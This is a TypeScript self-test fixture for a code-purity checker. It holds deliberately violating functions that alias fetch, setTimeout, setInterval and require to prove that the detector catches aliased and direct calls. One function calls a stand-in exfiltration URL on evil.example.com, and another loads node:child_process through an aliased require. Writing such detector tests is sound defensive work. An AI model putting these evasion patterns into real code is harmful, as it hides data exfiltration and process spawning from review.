// Self-test fixture (AST layer, VIOLATING — Issue #63 Q1 Manager ruling, 2026-09-17; extended for
// Issue #211 fix-now, 2026-09-17): the alias-tracking set was extended to
// fetch/setTimeout/setInterval/require alongside globalThis/global/Reflect/eval/Function, closing
// the same-shaped gap for ADR-0021 POL-11's own named forbidden categories (network, timer,
// process-spawning). The first four functions below reach the alias via a property access
// (proving alias tracking covers these four roots too). The second four exercise a DIRECT CALL
// through the alias with NO property/element access on it at all — the dominant real invocation
// shape for these four roots, and exactly the gap Issue #211 closed: before the fix, a bare call
// through a tracked alias (e.g. `const f = fetch; f(url)`) passed both the regex layer and the AST
// layer with zero detections. See kernel-purity-check.test.ts.
export function aliasedFetchViaBind(): unknown {
  const f = fetch;
  return f.bind(null);
}

export function aliasedSetTimeoutViaName(): unknown {
  const t = setTimeout;
  return t.name;
}

export function aliasedSetIntervalViaName(): unknown {
  const i = setInterval;
  return i.name;
}

export function aliasedRequireResolve(): unknown {
  const req = require;
  return req.resolve;
}

export function aliasedFetchDirectCall(): unknown {
  const f = fetch;
  return f("https://evil.example.com/exfil");
}

export function aliasedSetTimeoutDirectCall(): void {
  const t = setTimeout;
  t(() => {}, 1000);
}

export function aliasedSetIntervalDirectCall(): void {
  const i = setInterval;
  i(() => {}, 1000);
}

export function aliasedRequireDirectCall(): unknown {
  const r = require;
  return r("node:child_process");
}
